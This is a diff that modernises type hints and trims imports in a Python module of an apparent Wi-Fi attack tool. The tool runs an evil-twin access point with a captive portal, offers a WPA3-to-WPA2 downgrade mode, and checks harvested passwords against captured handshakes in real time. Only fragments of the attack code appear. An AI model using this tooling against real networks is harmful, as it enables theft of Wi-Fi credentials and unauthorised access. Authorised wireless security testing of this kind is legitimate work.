@@ -14,9 +14,6 @@ from __future__ import annotations
 import http.server
 import json
 import logging
-import os
-import re
-import signal
 import subprocess
 import tempfile
 import textwrap
@@ -24,16 +21,15 @@ import threading
 import time
 from datetime import datetime
 from pathlib import Path
-from typing import Optional
-from urllib.parse import parse_qs, urlparse
+from urllib.parse import parse_qs
 
 from rich import box
 from rich.console import Console
 from rich.panel import Panel
 
-from .exceptions import DependencyError
-from .runner import SubprocessRunner
 from modules import radio
+
+from .runner import SubprocessRunner
 
 logger = logging.getLogger(__name__)
 console = Console()
@@ -46,7 +42,7 @@ PERSONALITY_STEALTH  = 3
 PERSONALITY_DOWNGRADE = 4   # WPA2-only clone of a WPA3-transition AP (SAE downgrade)
 
 
-def downgrade_recommended(target: Optional[dict]) -> bool:
+def downgrade_recommended(target: dict | None) -> bool:
     """
     True if *target* is a WPA3 transition-mode AP — the case where a WPA2-only
     clone can coerce a WPA3-capable client onto the dictionary-crackable WPA2
@@ -154,8 +150,8 @@ class _PortalHandler(http.server.BaseHTTPRequestHandler):
     _submit_count: dict[str, int] = {}  # MAC → attempt count (class-level shared)
     # When set (from a captured handshake), a submitted password is verified
     # against the real PSK in real time — see modules/pmkid.make_pmkid_verifier.
-    verify_password: Optional[object] = None
-    verified_password: Optional[str]  = None
+    verify_password: object | None = None
+    verified_password: str | None  = None
 
     def log_message(self, fmt: str, *args: object) -> None:
         logger.debug("portal: " + fmt, *args)
@@ -164,7 +160,7 @@ class _PortalHandler(http.server.BaseHTTPRequestHandler):
         return self.client_address[0]
 
     @classmethod
-    def _evaluate(cls, passwd: str, attempt_num: int) -> tuple[Optional[bool], bool]:
+    def _evaluate(cls, passwd: str, attempt_num: int) -> tuple[bool | None, bool]:
         """
         Decide the portal's response to a submission. Returns
         ``(verified, show_connecting)``:
@@ -349,7 +345,7 @@ def _teardown_ap_interface(ap_iface: str, gw_ip: str = "10.0.0.1") -> None:
 
 # ─── Audit logging helper ─────────────────────────────────────────────────────
 
-def _audit(event: str, bssid: str, personality: int, extra: Optional[dict] = None) -> None:
+def _audit(event: str, bssid: str, personality: int, extra: dict | None = None) -> None:
     import logging as _log
     _log.getLogger("modules.utils").info(
         "PHANTOM_AP event=%s bssid=%s personality=%d phantom_ap=True extra=%s",
@@ -361,15 +357,14 @@ def _audit(event: str, bssid: str, personality: int, extra: Optional[dict] = Non
 
 def phantom_menu(
     interface: str,
-    target: Optional[dict],
-    verify_hashfile: Optional[str] = None,
+    target: dict | None,
+    verify_hashfile: str | None = None,
 ) -> None:
     """Interactive Phantom AP launcher. Called from CLI menu.
 
     If *verify_hashfile* points at a captured ``.hc22000`` for the target, the
     captive portal verifies every submitted password against the real PSK.
     """
-    from .i18n import t
 
     console.print()
     console.print(Panel(
@@ -452,13 +447,12 @@ def _run_phantom(
     channel: int,
     personality: int,
     vendor: str,
-    verify_hashfile: Optional[str] = None,
+    verify_hashfile: str | None = None,
 ) -> None:
     """
     Core Phantom AP runner.
     Starts hostapd + dnsmasq + captive portal, blocks until Ctrl+C.
     """
-    import shutil
 
     AP_IFACE  = "phantom0"
     GW_IP     = "10.0.0.1"
@@ -505,7 +499,7 @@ def _run_phantom(
         return
 
     # ── Start dnsmasq ─────────────────────────────────────────────────────
-    console.print(f"  [cyan][*][/cyan] Starting dnsmasq (DHCP + DNS redirect)...")
+    console.print("  [cyan][*][/cyan] Starting dnsmasq (DHCP + DNS redirect)...")
     dnsmasq_proc = radio.spawn(
         ["dnsmasq", "-C", str(dnsmasq_conf), "--no-daemon"],
         stdout=subprocess.PIPE, stderr=subprocess.PIPE,
@@ -513,8 +507,8 @@ def _run_phantom(
     time.sleep(1)
 
     # ── Captive portal (Stealth skips portal) ─────────────────────────────
-    portal_thread: Optional[threading.Thread] = None
-    httpd: Optional[http.server.HTTPServer] = None
+    portal_thread: threading.Thread | None = None
+    httpd: http.server.HTTPServer | None = None
 
     # If the operator already captured a handshake/PMKID for this target, build
     # a real-time verifier so the portal confirms the true PSK instead of
@@ -581,8 +575,8 @@ def _cleanup_phantom(
     ap_iface: str,
     hostapd_conf: Path,
     dnsmasq_conf: Path,
-    hostapd_proc: Optional[subprocess.Popen],
-    dnsmasq_proc: Optional[subprocess.Popen],
+    hostapd_proc: subprocess.Popen | None,
+    dnsmasq_proc: subprocess.Popen | None,
 ) -> None:
     for proc in (hostapd_proc, dnsmasq_proc):
         if proc and proc.poll() is None:
